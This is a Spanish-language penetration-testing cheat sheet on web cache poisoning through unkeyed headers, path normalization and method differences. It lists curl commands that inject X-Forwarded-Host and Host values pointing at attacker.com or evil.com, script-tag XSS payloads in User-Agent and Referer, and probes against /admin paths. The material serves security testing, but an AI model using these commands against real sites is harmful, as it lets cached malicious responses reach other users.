---
aliases:
  - Unkeyed Headers
  - Unkeyed Cookies
  - Unkeyed Method
  - Param Miner Workflow
tags:
  - vuln/cache-poisoning
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Web Cache Poisoning]]"
---
# Web Cache Poisoning - Unkeyed Inputs

---

## Headers No Incluidos en Cache Key

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-Host: attacker.com" "https://target/?cb=$(date +%s)"` | Inyectar XFH unkeyed → cache stores response con XFH reflected | Vector más común. |
| `curl -H "Host: attacker.com" "https://target/?cb=$(date +%s)"` | Direct Host header poison | Apps con vhost routing. |
| `curl -H "X-Forwarded-Scheme: http" "https://target/?cb=$(date +%s)"` | Force scheme → redirect injection cached | URL building from scheme. |
| `curl -H "X-Forwarded-Port: 1337" "https://target/?cb=$(date +%s)"` | Port injection en URL building | Reflected en `<base href>`. |
| `curl -H "X-Original-URL: /admin" "https://target/?cb=$(date +%s)"` | Path override interno (IIS) | Backend processes admin via header. |
| `curl -H "Origin: https://attacker.com" "https://target/?cb=$(date +%s)"` | Reflected Origin → XSS candidate | CORS reflection. |
| `curl -H "User-Agent: <script>alert(1)</script>" "https://target/error?cb=$(date +%s)"` | UA reflejado en error pages cached | UA-reflection XSS. |
| `curl -H "Referer: <script>alert(1)</script>" "https://target/?cb=$(date +%s)"` | Referer reflected cacheado | Referer-reflection XSS. |
| `curl -H "Accept-Language: x-fake; <script>" "https://target/?cb=$(date +%s)"` | i18n reflection | Localized page reflection. |
| `for h in 'X-Forwarded-Host' 'X-Forwarded-Scheme' 'X-Original-URL' 'X-Rewrite-URL' 'X-Forwarded-For' 'X-Real-IP' 'X-Host' 'X-Override-URL' 'X-HTTP-Method-Override' 'Forwarded'; do curl -sI -H "$h: probe" "https://target/?cb=$RANDOM" \| grep -iE 'x-cache\|age:'; done` | Bulk unkeyed header probe | Discovery automation. |
^wcp-unkeyed-headers

### Workflow para identificar unkeyed header

```bash
URL="https://target/page?cb=$(date +%s)"

# Baseline (sin header)
R1=$(curl -s "$URL")
curl -sI "$URL" | grep -iE 'x-cache|age:'

# Con header sospechoso
URL2="https://target/page?cb=$(date +%s)-2"
curl -sI -H "X-Forwarded-Host: evil.com" "$URL2" | grep -i x-cache
curl -sI "$URL2" | grep -i x-cache  # Sin el header

# Si segundo request HIT con response del primero (con header) → header UNKEYED
```

---

## Param Miner Workflow

| **Vector / Ubicación** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → Extensions → BApp Store → "Param Miner" → Install | Setup extension | Primera vez. |
| Right-click cacheable request → "Guess headers" | Auto-discover headers ocultos que afectan response | Single click discovery. |
| Right-click → "Guess params" | Discover hidden query/body params | Cache key analysis. |
| Param Miner → Settings → "Force cache miss" → ON | Aplicar cache buster automáticamente | Necesario para fuzz. |
| Param Miner → Settings → "Identify cache parameters" → ON | Modo dedicado mapeo cache key | Pre-attack. |
| Param Miner → Settings → "Reflect to attack mode" → ON | Auto-marca headers reflejados | Pre-XSS hint. |
| Param Miner → Settings → "Probe twice to confirm" → ON | Reduce false positives | Reliability. |
| Param Miner → Output panel | Findings: reflected headers + unkeyed inputs | Post-scan review. |
| Burp → BApp Store → "Reflection" → install | Highlight reflected inputs en historial | Pre-survey. |
^wcp-unkeyed-paramminer

---

## Method / Path Normalization Differences

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/admin"` y `curl -sI "https://target/admin/"` | Compare cache HIT/MISS entre with/without trailing slash | Cache key path-string vs backend-normalized. |
| `curl -sI "https://target//admin"` (doble slash) | Cache key distinto, backend normaliza | Path normalization differential. |
| `curl -sI "https://target/admin%2F"` (encoded slash) | Cache stores encoded variant | Backend decodes. |
| `curl -sI "https://target/p%61ge"` (encoded char) | Encoded path key | Decode-after-cache differential. |
| `curl -sI "https://target/foo/../admin"` (path traversal canonical) | Cache stores raw, backend normaliza | Compound. |
| `curl -sI "https://target/Admin"` y `curl -sI "https://target/admin"` | Case sensitivity differential | IIS / Windows backend. |
| `curl -sI "https://target/?a=1&b=2"` y `curl -sI "https://target/?b=2&a=1"` | Query order differential | Cache string-based key. |
| `curl -sI "https://target/?a=1&a=2"` | Duplicate param cache key | Backend HPP. |
| `curl -X POST -H "X-HTTP-Method-Override: GET" "https://target/admin"` | Method override → backend GET, cache POST | Method differential. |
| `curl -I "https://target/admin"` (HEAD) y comparar con `curl -sI "https://target/admin"` (GET) | HEAD response cached as GET | Method-based separate vectors. |
^wcp-unkeyed-normalization

### Path normalization probe

```bash
URL_BASE="https://target/admin"
URL_DOUBLE="https://target//admin"
URL_TRAILING="https://target/admin/"

for u in "$URL_BASE" "$URL_DOUBLE" "$URL_TRAILING"; do
  echo "=== $u ==="
  curl -sI "$u" | grep -iE 'x-cache|age:'
done

# Si todos return same content pero distinct cache HIT → cache key differential
```

---
